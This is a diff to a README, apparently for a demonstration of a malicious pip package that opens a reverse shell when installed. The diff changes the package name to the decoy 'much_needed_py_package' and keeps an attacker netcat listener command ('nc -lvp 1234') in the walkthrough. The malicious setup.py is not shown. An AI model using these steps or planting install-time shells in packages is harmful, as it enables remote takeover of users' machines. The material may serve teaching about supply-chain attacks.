@@ -28,6 +28,9 @@ Two terminal windows. (If two machines, change the code in setup.py)
 
 Attacker: Listen on 1234 port with netcat`nc -lvp 1234`
 
-Victim: Execute pip install command`pip install pip-remote-access`
+Victim: Execute pip install command`pip install much_needed_py_package`
 
-We can see in attacker's window, it gets a reverse shell estatblished.
+We can see in attacker's window, a reverse shell is estatblished.
+
+![CleanShot 2023-04-08 at 23 18 14](https://user-images.githubusercontent.com/26541990/230758877-3ee9c521-3490-485d-b389-1d543e7c1719.png)
+
